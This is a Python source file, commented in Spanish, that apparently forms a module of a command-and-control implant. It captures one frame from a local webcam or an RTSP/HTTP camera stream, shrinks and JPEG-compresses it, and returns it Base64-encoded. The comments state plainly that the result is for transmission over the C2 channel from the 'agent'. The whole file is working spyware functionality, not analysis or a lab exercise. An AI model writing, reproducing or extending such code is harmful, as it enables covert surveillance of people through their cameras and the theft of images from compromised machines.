import base64
import os
try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

def capture_frame(stream_url: str) -> dict:
    """
    Intenta abrir un stream de video (RTSP, HTTP, o dispositivo local /dev/video0),
    captura 1 frame, lo comprime fuerte para su envío por C2 y devuelve Base64.
    """
    if not CV2_AVAILABLE:
        return {"error": "El paquete opencv-python no está instalado en el agente."}

    # Si es numérico (ej. "0" o 0), es una cámara local
    if str(stream_url).isdigit():
        target = int(stream_url)
    else:
        target = str(stream_url)

    try:
        # Abrir captura de video (timeout corto para no bloquear a nivel de red)
        cap = cv2.VideoCapture(target, cv2.CAP_FFMPEG)
        if not cap.isOpened():
            # Alternative sin FFMPEG for local cameras etc
            cap = cv2.VideoCapture(target)
            if not cap.isOpened():
                return {"error": f"No se pudo conectar al stream de video: {stream_url}"}

        # Leer un frame
        ret, frame = cap.read()
        cap.release()

        if not ret or frame is None:
            return {"error": "Conectado al stream pero no se pudo leer el frame."}

        # Redimensionar si es muy grande para no sobrecargar el C2
        height, width = frame.shape[:2]
        max_size = 640
        if width > max_size or height > max_size:
            ratio = max_size / max(width, height)
            new_size = (int(width * ratio), int(height * ratio))
            frame = cv2.resize(frame, new_size, interpolation=cv2.INTER_AREA)

        # Comprimir en formato JPEG con calidad del 60%
        encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 60]
        result, encimg = cv2.imencode('.jpg', frame, encode_param)
        
        if not result:
            return {"error": "Fallo al codificar el frame en JPEG."}

        img_data = encimg.tobytes()
        b64_data = base64.b64encode(img_data).decode('utf-8')

        return {
            "success": True,
            "data": b64_data,
            "size": len(img_data),
            "width": frame.shape[1],
            "height": frame.shape[0]
        }

    except Exception as e:
        return {"error": f"Excepción capturando video: {str(e)}"}
